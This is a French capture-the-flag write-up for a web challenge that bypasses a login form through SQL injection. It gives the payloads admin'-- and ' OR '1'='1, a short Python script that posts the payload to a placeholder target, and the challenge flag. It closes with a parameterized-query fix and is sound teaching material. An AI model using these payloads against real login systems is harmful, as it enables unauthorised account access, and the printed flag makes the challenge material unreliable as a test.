# Writeup — SQLi Bypass

**Catégorie** : Web  
**Difficulté** : Medium  
**Points** : 150  
**Flag** : `CTF{sqli_auth_bypass_union_select}`

## Contexte

L'injection SQL dans un formulaire d'authentification permet de manipuler la requête SQL pour bypass la vérification des credentials sans connaître le mot de passe.

## Étapes de résolution

### 1. Détecter la vulnérabilité

Entrer une apostrophe `'` dans le champ username → erreur SQL ou comportement inattendu.

### 2. Bypass d'authentification

**Payload dans le champ username** :
```
admin'--
```
Laisser le mot de passe vide ou mettre n'importe quoi.

La requête générée devient :
```sql
SELECT username, role FROM users WHERE username='admin'--' AND password='...'
```
Le `--` commente la vérification du mot de passe → accès admin accordé.

### 3. Alternative

```
' OR '1'='1
```
Se connecte en tant que le premier utilisateur de la base (souvent admin).

## Script automatisé

```python
import requests

url = "http://TARGET:5032/login"
r = requests.post(url, data={"username": "admin'--", "password": "x"})
if "CTF{" in r.text:
    print("[+] SQLi successful!")
    # Extract flag from response
```

## Correction

Utiliser des requêtes préparées (parameterized queries) :
```python
cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```
